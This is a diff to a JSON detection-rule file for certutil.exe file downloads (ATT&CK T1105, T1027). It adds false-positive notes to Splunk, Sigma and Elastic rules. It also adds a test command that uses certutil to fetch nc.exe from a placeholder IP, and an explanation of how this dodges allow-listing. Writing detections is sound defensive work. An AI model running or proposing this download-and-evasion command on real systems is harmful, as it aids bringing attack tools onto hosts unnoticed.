@@ -125,7 +125,8 @@
           "T1027"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "IT admin tools, endpoint management agents, or security scanners performing similar actions"
       },
       {
         "platform": "splunk",
@@ -140,7 +141,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts, management agents, or IT tools launching similar processes"
       },
       {
         "platform": "splunk",
@@ -152,7 +154,8 @@
           "T1027"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate web traffic to similar domains or using similar user-agent strings"
       },
       {
         "platform": "sigma",
@@ -164,7 +167,8 @@
           "T1027"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "sigma",
@@ -176,7 +180,8 @@
           "T1027"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -187,7 +192,9 @@
           "T1105",
           "T1027"
         ],
-        "fidelity": "signature"
+        "fidelity": "signature",
+        "false_positives": "Legitimate admin tools or management agents performing similar endpoint operations",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -223,7 +230,8 @@
         "Review Microsoft Defender for Endpoint, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "certutil.exe -urlcache -split -f http://<ip>:8000/nc.exe nc.exe"
     }
   },
   "explain": "Downloads a file using certutil.exe, a trusted signed Windows binary, to dodge app allow-listing:\n  -urlcache   use the URL cache download path\n  -split      write the raw file (split off the cert wrapper)\n  -f          force overwrite / refetch\n  http://<ip>:8000/nc.exe nc.exe   remote source and local filename\nThe download looks like normal signed-binary activity; bitsadmin, certreq, and other LOLBAS entries do the same job."
